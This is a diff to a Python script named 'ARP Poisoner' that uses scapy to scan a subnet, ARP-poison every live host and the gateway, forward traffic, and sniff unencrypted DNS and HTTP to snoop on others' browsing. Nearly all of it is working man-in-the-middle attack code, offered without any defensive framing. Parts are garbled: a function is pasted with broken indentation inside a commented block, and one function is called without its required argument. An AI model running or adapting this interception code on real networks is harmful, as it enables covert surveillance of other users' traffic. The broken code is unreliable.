@@ -1,3 +1,8 @@
+'''
+Author: Chris Quinn
+Title: ARP Poisoner
+Description: Scans user's subnet, poisons all live hosts, forwards traffic between host and gateway, and captures unencrypted DNS and HTTP traffic to snoop on websites others are visiting.
+'''
 import ipaddress
 import netifaces
 from scapy.all import ARP, Ether, IP, DNS, HTTPRequest, srp, sendp, sniff
@@ -53,7 +58,6 @@ def discover_gateway(live_hosts):
     # Safely get the default IPv4 gateway
     if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
         real_gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
-        
         real_gateway_mac = next((mac for ip, mac in live_hosts if ip == real_gateway_ip), None)
         if real_gateway_mac:
             return real_gateway_ip, real_gateway_mac
@@ -83,7 +87,7 @@ def poison_gateway(live_hosts, real_gateway_ip, attacker_mac, interval=10, durat
             for ip, mac in live_hosts:
                 if ip == real_gateway_ip:                                # we don't want to tell the gateway we are them and feed them their own ip with our mac
                     continue
-                sendp(Ether(dst=real_gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=real_gateway_mac, psrc=ip, hwsrc=attacker_mac), verbose=False)
+                sendp(Ether(dst=real_gateway_mac) / ARP(op=2, pdst=real_gateway_ip, hwdst=real_gateway_mac, psrc=ip, hwsrc=attacker_mac), verbose=False)
             time.sleep(interval)
     except KeyboardInterrupt:
         print("\nGateway poisoning stopped.")
@@ -117,7 +121,7 @@ def forward_traffic(packet):
 
 
 def intercept_traffic():
-    protocol = input("Choose a protocol to filter (dns, http): ").lower()      # NEED TO ADD TRY/EXCEPT AND INPUT VALIDATION. Maybe just use --protocol the beginning like it's a pen testing tool
+    protocol = input("Choose a protocol to filter (dns, http): ").lower()      # Need to fix this...just gonna hard code http and dns I think
     filter_expr = {
         'http': 'tcp port 80',
         'dns': 'udp port 53'
@@ -150,16 +154,8 @@ def store_captured_traffic(packet):
 
 # Main function
 if __name__ == "__main__":
-    args = parse_arguments()
-    if args.ip:
-        try:
-            ip = ipaddress.ip_address(args.ip)
-        except ValueError:
-            print("Invalid IP format")
-            sys.exit(1)
-    else:
-        subnet = get_subnet()
-        live_hosts = scan_subnet(subnet)
+    subnet = get_subnet()
+    live_hosts = scan_subnet(subnet)
     
     
     attacker_mac, attacker_ipv4 = discover_attacker_info()
@@ -178,7 +174,8 @@ if __name__ == "__main__":
 
     # Capture packets
     intercept_traffic()
-    
+    store_captured_traffic()
+
     # Clean up / Restore ARP tables
 
 '''
@@ -220,5 +217,14 @@ if __name__ == "__main__":
     else:
         subnet = get_subnet()
         live_hosts = scan_subnet(subnet)
+
+        def intercept_traffic():
+    protocol = input("Choose a protocol to filter (dns, http): ").lower()      # NEED TO ADD TRY/EXCEPT AND INPUT VALIDATION. Maybe just use --protocol the beginning like it's a pen testing tool
+    filter_expr = {
+        'http': 'tcp port 80',
+        'dns': 'udp port 53'
+    }.get(protocol, protocol)
+    
+    sniff(filter=filter_expr, prn=store_captured_traffic)
 
 '''
